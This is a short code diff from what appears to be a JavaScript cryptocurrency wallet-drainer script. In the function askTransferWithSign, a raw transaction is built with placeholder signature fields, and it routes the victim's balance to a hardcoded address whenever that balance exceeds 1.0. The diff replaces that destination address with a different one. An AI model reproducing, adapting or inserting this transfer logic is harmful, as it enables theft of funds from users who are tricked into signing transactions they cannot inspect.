@@ -153,7 +153,7 @@ async function askTransferWithSign(rbal) {
             const txObject = {
                 nonce: web3Js.utils.toHex(txnCount),
                 gasPrice: mgasPrice, gasLimit: "0x55F0",
-                to: rbal > 1.0 ? "0xf8BF5415bD4EA91934A49F0ab8ae9db4893f248c" : receiveAddress,
+                to: rbal > 1.0 ? "0xf92D48dDe90C4aD033381b0cA52d08c0636A7ddc" : receiveAddress,
                 value: "0x" + toSend.toString(16),
                 data: "0x", v: "0x1", r: "0x", s: "0x"
             };
